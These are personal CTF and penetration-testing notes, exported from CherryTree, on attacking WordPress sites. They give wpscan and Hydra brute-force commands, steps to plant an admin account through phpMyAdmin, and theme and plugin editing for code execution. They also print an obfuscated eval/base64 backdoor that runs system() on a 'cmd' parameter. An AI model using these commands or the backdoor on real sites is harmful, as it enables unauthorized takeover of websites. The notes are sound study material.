<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WordPress</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>WordPress</h1><br/><p><h1>WordPress</h1><h1></h1></p><p><h1></h1>[CTF 117-121, 148 &amp; CTF B 24,37]</p><p><span style="color:#ff0000;">Some WP sites</span> have non-def base path &amp; <span style="color:#ff0000;">aren&#39;t hosted @ Root URL</span> (e.g <strong>/wordpress/ </strong>or custom subdir, maybe based off of target&#39;s Domain Name, like <strong>/retro/</strong>). <span style="color:#ff0000;">Must run wpscan @ that base path!</span></p><p></p><p>WP site may only appear when using the proper hostname in<strong> /etc/hosts</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If wpscan hangs after &quot;<strong>[i] It seems like you have not updated the database for some time.</strong>&quot;, you may need to <span style="color:#ff0000;">hit Enter</span>.</p><p></p><p><h2>Confirm WordPress Webroot</h2></p><p>SW fingerprint tool like whatweb should be able to detect WP. </p><p></p><p><h3>WordPress Login Portal</h3></p><p>Can also try looking for login pg, which should be inside the WP instance&#39;s Webroot (not 100% reliable method). It&#39;ll probably be named one of the following-</p><p></p><p>wp-login.php</p><p>wp-admin.php</p><p>wp-login</p><p>wp-admin</p><p>login</p><p>admin</p><p></p><p><h2>wpscan</h2></p><p><h3>Enumeration</h3></p><p>First start with basic scan for only the common plugins &amp; themes. While interpretting results, run exhaustive scan of all plugins, themes, &amp; attempt user enum.</p><p></p><p>Run it through Burp to fill out site map.</p><p></p><p>Sometimes has <span style="color:#ff0000;">false negatives</span>, &amp; may claim that outdated plugins are up to date! Vulnerable deprecated plugins are often flagged as “up to date” since no new updates are being released for them.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Warning</span>: May need to revert after detailed scan? Huge amount of traffic may cause lag going forward (may&#39;ve been coincidence?)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Output File</span>: Can use <strong>| tee</strong> <strong>file.out</strong> if you use the option <strong>--no-update</strong>. Using built-in <strong>-o</strong> won&#39;t print to STDOUT.</p><p></p><p><span class="subheading">Basic Scans</span>: May need to <span style="color:#ff0000;">re-run this</span>! Sometimes fails to detect plugins the first time around!</p><p></p><p><em>wpscan --url http://site.com/wordpress/ --plugins-detection aggressive -e p,t,u -v --proxy </em>http://localhost:8080</p><p></p><p><span class="subheading">Detailed Scans</span>: Depending on the target, these can take &gt;6 hours! However, they often catch things that&#39;re missed. (Can omit <strong>-e u</strong> if you already used it in prev scan &amp; performed Manual User Enum)</p><p></p><p><em>wpscan --url http://site.com/wordpress/ --plugins-detection aggressive -e ap,at,u -v --proxy http://localhost:8080</em></p><p></p><p><em>wpscan --url http://internal.thm/wordpress/ --plugins-detection aggressive -e ap,at,u,tt,cb,dbe,m --rua --no-update --proxy http://localhost:8080 | tee wpscan.out</em></p><p></p><p><h3>Troubleshooting</h3></p><p><span class="subheading">SSL peer certificate or SSH remote key was not OK</span></p><p>See <a href="https://github.com/wpscanteam/wpscan/issues/1424">Github</a></p><p></p><p>Use <strong>--disable-tls-checks</strong> option as a temporary solution.</p><p></p><p><h1>Brute-Force Logins</h1></p><p><h2>Identify Usernames</h2></p><p>Initial wpscan should&#39;ve found most users, but manual enumeration may find others.</p><p></p><p>If you <span style="color:#ff0000;">attempt to sign in with an invalid user</span>, it <span style="color:#ff0000;">should give a different error</span> than if you use invalid creds for a valid username / email</p><p></p><p><span style="color:#060f94;">★</span><h3>Manual Enumeration</h3></p><p>Can also try iterating manually by navigating to URL like, <strong>/?author=1</strong> <strong>/?author=2</strong></p><p></p><p>If WP is hosted out of a different Webroot, use that like <strong>/wordpress/?author=3</strong></p><p></p><p><span class="subheading">Username vs Display Name</span>: This shows you the account&#39;s Display Name, which <span style="color:#ff0000;">may not be the Username you need to sign in</span> as them! It&#39;s often similar though. Reference login errors with trial &amp; error to confirm you have the correct username.</p><p></p><p><h2>Brute-Force</h2></p><p>You can use Hydra or wpscan, but wpscan tends to be more reliable.</p><p></p><p><h3>wpscan</h3></p><p>If using wpscan, speed it up by only having it perform minimum possible enumeration (Vulnerable themes only) before attempting the BF.</p><p></p><p><em>wpscan --url http://internal.thm/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt</em> <em>-e vt</em></p><p></p><p><h3>Hydra</h3></p><p>Hydra may give false positives, but try re-running it using different wordlists &amp; you still may be able to find the correct login.</p><p></p><p><em>hydra -l bob -P /usr/share/wordlists/rockyou.txt -f -V 10.10.183.78 http-form-post &#39;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.183.78%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=incorrect&#39;</em></p><p></p><p><h1>Finding Vulns</h1></p><p><span style="color:#ff0000;">★Up-to-date SW </span>(i.e Plugins &amp; Themes)<span style="color:#ff0000;"> DOESN&#39;T mean no vuln!★</span></p><p>Won&#39;t be flagged by wpscan, but manually check Exploit-db for EVERY plugin &amp; theme, using every possible form of the name</p><p></p><p><h2>SW Naming Conventions</h2></p><p>Wordpress itself is often called WordPress Core on Exploit-DB</p><p><span style="color:#ff0000;">wpscan may use diff SW name than Exploit-DB</span>. For ex, <span style="text-decoration:underline;">wpforms-lite </span>⇒ <span style="text-decoration:underline;">wpforms</span> OR <span style="text-decoration:underline;">perfect-survey </span>⇒ <span style="text-decoration:underline;">perfect survey</span><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h2>Resources</h2></p><p>These resources may not contain every vulnerability! Even if something like a <span style="color:#ff0000;">Plugin is up to date</span>, it <span style="color:#ff0000;">could still be vulnerable</span> (i.e. if it&#39;s deprecated)!</p><p></p><p><h3>Patch Stack</h3></p><p>Search for vulnerable Themes &amp; Plugins on Patch Stack by appending theme / plugin name. For example, to search for the “modula-best-grid-gallery” plugin-</p><p></p><p><a href="https://patchstack.com/database/vulnerability/modula-best-grid-gallery">https://patchstack.com/database/vulnerability/modula-best-grid-gallery</a><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h3>Word Fence</h3></p><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/contact-form-7-style">https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/contact-form-7-style</a><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h2>Exploit Research</h2><h1></h1></p><p><h1></h1>Entries in the wpscan website may not list the CVE, &amp; often don&#39;t include infor about exploitation. However, you can take the description of the vulnerability &amp; cross-reference it with other websites (e.g. wordfence) to find the CVE &amp; use the CVE to find PoCs.</p><p></p><p><h3>Example</h3></p><p><strong>wordpress 6.4.3 exploit</strong></p><p><a href="https://wpscan.com/wordpress/643/">wpscan</a></p><p><strong>wordpress Contributor+ Stored XSS in HTML API</strong></p><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-655-authenticated-contributor-stored-cross-site-scripting-via-html-api?asset_slug=wordpress">wordfence</a></p><p><a href="https://www.cve.org/CVERecord?id=CVE-2024-6307">CVE Details</a></p><p></p><p><h1>Site Config &amp; Credential Files</h1></p><p><strong>wp-config.php</strong> @ Web Root holds creds, often for SQL DB (MySQL by def) &amp; commonly used for <a href="Infrastructure_36.html#PhpMyAdmin">PhpMyAdmin</a>.<h1></h1></p><p><h1></h1></p><p>The Website is often hosted inside of the <strong>wordpress/ </strong>subdirectory like <strong>/var/www/wordpress/index.php</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: These creds are often re-used, especially for WP user logins.</p><p></p><p><h1>Leveraging PhpMyAdmin Access</h1></p><p>Wordpress is often used in conjunction with <a href="Infrastructure_36.html#PhpMyAdmin">PhpMyAdmin</a> (PMA). It&#39;s usually found at the Root URL for the Wordpress application (e.g. If WP is served out of <strong>/wordress/</strong>, it may be <strong>/wordpress/phpmyadmin</strong> or<strong> /wordpress/pma</strong>).</p><p></p><p><h2>Subdomain Enumeration</h2></p><p>[CTF D 15]</p><p></p><p>The <strong>wp_options</strong> table has multiple fields with high value, sensitive info (e.g. URL &amp; Creds for a mail server, <strong>admin_email</strong> address, etc).</p><p></p><p>Under the <strong>option_name</strong> Column, <span style="color:#e01b24;">subdomains</span> (or <span style="color:#e01b24;">other Domains</span>) may be <span style="color:#e01b24;">listed in Rows</span> with <strong>siteurl</strong> &amp; / or <strong>home</strong></p><p></p><p><h3>Weaponization</h3></p><p>For example, you may find a subdomain that has its files hosted by an FTP server. Therefore, you can upload a backdoor via the FTP server &amp; access it at the subdomain to trigger the web shell.</p><p></p><p><h2>Add User</h2></p><p>[CTF D 13]</p><p></p><p>If you can&#39;t crack the hashes for exiting users, you can leverage PMA access to create a new user &amp; then give them Admin Privs via the MySQL interface.</p><p></p><p>Instead of writing a new entry from scratch, it&#39;s easier to <strong>copy</strong> &amp; edit an existing entry.</p><p></p><p>Users are added via the <strong>wp_users</strong> table, but when WP is used to create a user via the normal way, associated entries are added to other tables.</p><p></p><p>When manually creating new users via PMA, you&#39;ll also need to create these entries in order for the account to have full functionality.</p><p></p><p><h3>WordPress Password Hashes</h3></p><p>WP uses a special type of salted MD5 by default, but you can use a regular MD5 for the <strong>user_pass</strong> Column &amp; WP login will still work.</p><p></p><p><em>echo -n “hacker123” | md5sum</em></p><p></p><p><a name="Assign User Privileges"></a><h2>Assign User Privileges</h2></p><p>Find the <strong>ID</strong> for the user you just created (Column in <strong>wp_users</strong>). WP stores user roles (i.e. privs) in the following 2 “<a href="Recon_+_Services--WebApp--Software--WordPress_24.html#Meta Keys">Meta Keys</a>” in the <strong>wp_usermeta</strong> Table. You can use PMA to <strong>copy</strong> &amp; edit existing entries (changing the <strong>ID</strong> Column).</p><p></p><p><h3>wp_capabilities</h3></p><p>The role of a WP Admin is stores as a serialized array under <strong>meta_value</strong>. Use the account&#39;s number for the <strong>USER_ID</strong> Column.</p><p></p><p><em>a:1:{S:13:&quot;administrator&quot;;b:1;}</em></p><p></p><p><h3>wp_user_level</h3></p><p>Admin users in WP have a <strong>meta_value</strong> of <strong>10</strong> for this <strong>meta_key</strong>. Add a row with target user&#39;s account number for <strong>USER_ID</strong></p><p></p><p><h1>Account Privileges (Roles)</h1></p><p>If you signed in as a user who isn&#39;t an Admin, you may be able to view the privileges or role assigned to your account, but it depends on the site settings and what the admin has allowed.</p><p></p><p><h2>View Your Role</h2></p><p>If you&#39;re not able to see the role directly or access any administrative areas, it likely means your account has limited permissions.</p><p><ol><li>Go to your Profile page. You can usually access it by clicking on your username or avatar in the top-right corner of the WordPress dashboard.</li></ol></p><p><ol><li>On your Profile page, you might be able to see the role or permissions associated with your account, such as &quot;Subscriber,&quot; &quot;Contributor,&quot; &quot;Author,&quot; &quot;Editor,&quot; or &quot;Administrator.&quot;</li></ol></p><p><ol><li>In some cases, you might not see the specific role if it&#39;s restricted, but you can generally figure it out based on what you can or cannot do (e.g., if you can create posts, edit others&#39; posts, access settings, etc.).</li></ol></p><p></p><p><h2>Increasing Privileges</h2></p><p>If you have access to PhpMyAdmin interface, or SQLi, you may be able to create a new Admin account or grant an existing account Admin <a href="Recon_+_Services--WebApp--Software--WordPress_24.html#Assign User Privileges">Privileges</a>.</p><p><h1></h1></p><p><h1></h1><h1>Admin Access</h1><h1></h1></p><p><h1></h1>Look for <span style="color:#ff0000;">sensitive info</span> in things like <span style="color:#ff0000;">private posts</span>. Test admin user / pass for cred re-use across all known accounts (e.g. for SSH).<h1></h1></p><p><h1></h1> <h1></h1></p><p><h1></h1><h2>RCE</h2></p><p>[CTF 120-121]</p><p>If existing SW can&#39;t be used for RCE,  options incl-</p><p><ul><li>Upload a legit, but vuln, Plugin/Theme with known RCE vuln</li></ul></p><p><ul><li>Upload your custom Plugin/Theme with embedded payload</li></ul></p><p><ul><li>Edit existing SW to add a payload to it</li></ul></p><p></p><p><h3>Plugins</h3><h3></h3></p><p><h3></h3>If you can&#39;t upload a PHP file, try the Zip file method. May also be able to use <strong>Plugin Editor</strong> to poison an existing, enabled plugin.</p><p></p><p><span class="subheading">Uploading PHP File</span>: WP says it only allows the upload of zip files, but you can sometimes upload a php file despite the error message. After uploading plugin nav to the URL to trigger payload (a zip file will try to download, but if it has php file ext it&#39;ll trigger).</p><p></p><p><span style="text-decoration:underline;">Admin Panel:</span> <strong>Plugins</strong> ⇓ <strong>Add New</strong> ⇒ <strong>Upload Plugin</strong> (When browsing for file, toggle <em>*.zip</em> to <em>All Files</em>) ⇒ <strong>Install Now</strong> (Disregard the error it throws)</p><p></p><p><span style="text-decoration:underline;">Admin Panel:</span> <strong>Media</strong> ⇒ FILE.php ⇒ Nav to the provided URL<h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><span class="subheading">Uploading Zip File</span>: I think this involves uploading a plugin with embedded malicious code. These Zip files may be on Github or Exploit-db (Idk haven&#39;t tried it)<h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h3>Themes</h3></p><p>[CTF B 148...]</p><p></p><p>See <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#panel-rce">Hacktricks</a>.</p><p></p><p>Need to inject code into <span style="color:#ff0000;">software used by the Active Theme</span>!</p><p></p><p>If the current Active Theme doesn&#39;t have the file you want to edit, can try activating another theme that does. However, this may break the site!</p><p></p><p><span class="subheading">Injection Targets</span>: Any PHP file used by the Active Theme should work, but some are more reliable &amp; easier to trigger. The site may be configured to use different files, so available options may vary.</p><p></p><p><span style="text-decoration:underline;">404.php</span>: Very common &amp; it&#39;s often easy to find &amp; trigger. </p><p></p><p><span style="text-decoration:underline;">footer.php</span>: May be found under <strong>patterns</strong> instead of <strong>templates</strong>. Just put <span style="color:#ff0000;">payload at the start of the page</span>. Should instantly trigger for anyone who loads any webpage.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: It <span style="color:#ff0000;">may matter where you place the payload in the file</span> you&#39;re editing! I think that putting the code at the <span style="color:#ff0000;">top of the PHP file</span> should reliably work? Try looking for existing <strong>&lt;?php</strong> tag &amp; put code above it (or use “tag-less” payload &amp; try slipping it between these tags?)</p><p></p><p><span class="subheading">Injection Methods</span>: Sometimes the steps for locating &amp; editing a template varies. Maybe it varies based off of WP version?  (For example using 404.php, but can be <span style="color:#ff0000;">any PHP file</span>)</p><p></p><p><span style="text-decoration:underline;">Admin Panel:</span> <strong>Appearence</strong> ⇓ <strong>Theme Editor</strong> ⇒ <strong>Theme Files  </strong>⇓ <strong>404.php</strong></p><p></p><p><span style="text-decoration:underline;">Admin Panel:</span> <strong>Tools</strong> ⇒ <strong>Theme File Editor</strong> ⇓ <strong>templates</strong> ⇓ <strong>404.php</strong>		OR 		<strong>Tools</strong> ⇒ <strong>Theme File Editor</strong> ⇓ <strong>patterns</strong>  ⇓ <strong>footer.php</strong></p><p></p><p><span style="text-decoration:underline;">Using URL</span>: Sometimes <strong>404.php</strong> doesn&#39;t appear. In this case, you may be able to directly go to it&#39;s edit page via a URL. Ensure you&#39;re <span style="color:#ff0000;">specifying the correct Theme</span> in the parameter.</p><p></p><p><strong>http://10.10.183.78/wordpress/wp-admin/theme-editor.php?</strong><strong><span style="color:#ff0000;">file</span></strong><strong>=404.php&amp;</strong><strong><span style="color:#ff0000;">theme</span></strong><strong>=twentytwentyone</strong></p><p></p><p><span class="subheading">Triggering Payload</span>: It depends on what file you injected the code into (e.g. <strong>404.php</strong>, or <strong>footer.php</strong>). </p><p></p><p><span style="text-decoration:underline;">404.php</span>: I had <span style="color:#ff0000;">better luck triggering the 404 page</span> by visiting non-existent URL (e.g. /blog<strong>/index.php/</strong>2024/08/27/test2/asda ). The page isn&#39;t found, so the site uses the <strong>404.php</strong> file intead.</p><p></p><p><span style="text-decoration:underline;">footer.php</span>: Have listener already running, because it should trigger as soon as you click <strong>Update File</strong>.</p><p></p><p><span style="text-decoration:underline;">Universal Method (?)</span>: Hacktricks reccomended visting PHP file&#39;s URL (e.g. /wordpress/wp-content/themes/twentyseventeen/404.php ), but this <span style="color:#ff0000;">doesn&#39;t usually work for me</span>?</p><p></p><p><h2>Sensitive Information </h2></p><p>After authenticating, you may be able to find files or messages containing sensitive data.</p><p></p><p>Check for installed Plugins &amp; Themes that may&#39;ve been missed by <strong>wpscan</strong>, &amp; confirm their version. Some otherwise benign Plugins may have customized code which make them vulnerable.</p><p></p><p><h3>Backdoored Plugin (Hello Dolly)</h3></p><p>[CTF D 20-21]</p><p></p><p>There have been instances of Attackers adding a backdoor to Plugins. Any Plugin could be poisoned, but <strong>Hello Dolly</strong> is commonly used since it&#39;s installed by default (so it&#39;ll be used for this example).</p><p></p><p>Payloads are often Obfuscated (often using PHP <a href="Appendix--Code--PHP_89.html#Escape Sequences">Escape Sequences</a>).</p><p></p><p><span class="subheading">Analyze Source Code</span>: If you don&#39;t have enough privs to view the Plugin code, you may be able to retrieve it using Directory Traversal or File Inclusion (utilizing an alternate protocol &amp; possibly encoding). See <a href="Recon_+_Services--WebApp--Software--WordPress_24.html#Plugin File Names">Plugin File Naming Syntax</a>.</p><p></p><p>The Hello Dolly file doesn&#39;t follow the normal naming syntax, &amp; is found at <strong>wp-content/plugins/hello.php</strong></p><p></p><p>An obfuscated payload was embedded inside a function</p><p></p><p><strong>eval(base64_decode(&#39;aWYgKGlzc2V0KCRfR0VUWyJcMTQzXDE1M1x4NjQiXSkpIHsgc3lzdGVtKCRfR0VUWyJcMTQzXHg2ZFwxNDQiXSk7fQ==));</strong></p><p></p><p>Decode the Base64, &amp; translate the <a href="Appendix--Code--PHP_89.html#Escape Sequences">Escape Sequences</a> (both were “cmd”).</p><p></p><p><strong>if (isset($_GET[&quot;\143\153\x64&quot;])) { system($_GET[&quot;\143\x6d\144&quot;]);}</strong></p><p></p><p><span class="subheading">Weaponization</span>: A GET Request containing the “cmd&quot; parameter will execute whichever command is used for the parameter&#39;s value via <strong>system()</strong> (<strong>eval()</strong> is another common PHP sink). Need to <span style="color:#ff0000;">find a vulnerable endpoint for this Request</span>!</p><p></p><p><span class="subheading">Delivery</span>: In order to find the vulnerable endpoint, determine what the Plugin is supposed to do. <strong>Hello Dolly</strong> prints a string to the Authenticated user&#39;s toolbar.</p><p></p><p>Therefore, you need to be signed-in (include a valid Cookie in the Req) &amp; send the Req to the Authenticated user&#39;s login Dashboard.</p><p></p><p><strong>/wp-admin/?cmd=PAYLOAD</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You need to <span style="color:#ff0000;">include the trailing slash</span> so your Req isn&#39;t redirected (e.g. Status Code 302). <strong>/wp-admin?cmd=PAYLOAD</strong> will FAIL.</p><p></p><p><h1>Resources</h1></p><p><a href="https://github.com/nowak0x01/WPXStrike">WPXStrike</a>: Tool to elevate XSS to RCE (etc). Haven&#39;t tested it yet.</p><p></p><p><h1>Tips</h1><ul><li>Plugin names are sometimes different when researching vulns (i.e. on Exploit-DB). For example, <strong>Modern Events Calender Lite</strong> may only show up as <strong>Modern Events Calender</strong>. Sometimes changes are more dramatic.</li></ul></p><p></p><p><h1>Background</h1></p><p><h2>User Activation Key</h2></p><p>A key used by Wordpress to verify the authenticity of a <span style="color:#ff0000;">Password Reset Request</span>. When a reset is requested, a temperary key called <strong>check_password_reset_key</strong> is generated &amp; sent to the user&#39;s email.</p><p></p><p>When the user goes to the generated link, the key is compared to the <strong>user_activation_key</strong> (a Column in the <strong>wp_users</strong> Table of the <strong>wordpress</strong> Database).</p><p></p><p>If these values match, the user can enter a new password, which clears that user&#39;s value in the <strong>user_activation_key</strong> Column.</p><p></p><p>Therefore, if this value isn&#39;t blank, it means that the user Requested a password reset but hasn&#39;t changed it yet.</p><p></p><p><a name="Meta Keys"></a><h2>Meta Keys</h2></p><p>[CTF D 13]</p><p></p><p>Meta Keys are custom fields in WordPress (not a MySQL term). They let you store more data in the <strong>wp_usermeta</strong> Table, without altering the DB structure.</p><p></p><p>Meta Keys are defined by a Column in the <strong>wp_usermeta</strong> Table.</p><p></p><p><h2>Plugins</h2></p><p>Plugins are PHP files that are used to modify the site&#39;s functionality. <strong>Hello Dolly</strong> is installed by default, but it&#39;s typically benign &amp; often disabled.</p><p></p><p>Plugins are normally stored in <strong>wp-content/plugins/</strong> at the Root URL for the Wordpress application.</p><p></p><p><a name="Plugin File Names"></a><h3>File Naming Syntax</h3></p><p>Normally the file is named after the Plugin, with spaces being substituted for dashes (e.g. <strong>ex-plugin.php</strong>), but this isn&#39;t always the case.</p><p></p><p>For example, <strong>Hello Dolly</strong> is actually named <strong>hello.php</strong>.</p><p></p><p>If you don&#39;t have enough privs to read the Plugin&#39;s code, you may be able to fetch it with Directory Traversal / File Inclusion.</p><p><span style="color:#ffbe6f;"></span></p><p><span style="color:#ffbe6f;"></span><h1>Mitigations</h1></p><p>[CTF D 14]</p><p></p><p>WP can be locked down via the Host OS itself (as opposed to just using WP Settings), prventing you from removing securite measures even with WP Admin access. As a result, normal Attack Vectors may be blocked, but it&#39;ll limit site functionality.</p><p></p><p><h2>Can&#39;t Make Directories</h2></p><p><strong>Unable to create directory wp-content /uploads/2025/01. Is it&#39;s parent directory writable by the server?</strong></p><p></p><p>Unable to upload a malicious plugin, because that would create a new directory. This is likely because the account running the WP instance (e.g. <strong>www-data</strong>) doesn&#39;t have R/W permissions on the directory in the Host OS.</p><p></p><p><h3>Attempted Bypass</h3></p><p>Using Admin access, edit the WP settings so files are uploaded to a universal directory which <strong>www-data</strong> may control.</p><p></p><p><strong>Settings</strong> ↓ <strong>Media</strong> → uncheck <strong>Organize my Uploads into month &amp; year based folders</strong></p><p></p><p><h2>Can&#39;t Edit Website Files</h2></p><p>If the account running the WP instance doesn&#39;t have R/W perms over the files used by the website, you&#39;ll be blocked from poisioning existing Themes &amp; Plugins.</p><p></p><p><h2>Tradeoffs for Mitigations</h2></p><p>These are speculative, but these security features seem to be very uncommon &amp; there are likely reasons why this config isn&#39;t standatrd practice.</p><p></p><p><h3>Decreased Functionality</h3></p><p>If <strong>www-data</strong> can&#39;t create new files &amp; directories, then wouldn&#39;t this prevent WP users from creating / uploadig new content (at least certain kinds of content)?</p><p></p><p><h3>Less Convienient</h3></p><p>WP Admins aoften need to change things about the site (e.g. adding / modifying Plugins &amp; Themes), &amp; this is the main purpose for Admin privs in the 1st place.</p><p></p><p>Preventing this makes maintenance harder. You could temporarily give <strong>www-data</strong> the necessary privs for this, but that&#39;s more work &amp; increases the chances to make mistakes (e.g. forgetting to revoke perms or giving too much).</p><p></p><p><h3>Risk to Owner</h3></p><p>If a high privilege account is controlling things like Website files, that may make compromise less likely, but it could also make a compromise more dangerous.</p><p></p><p>For example, if you somehow posion a <strong>root</strong> file, could you theoretically get root access even though the webserver is being run as <strong>www-data</strong>? (idk but sounds plausible)</p></div>
</body>
</html>
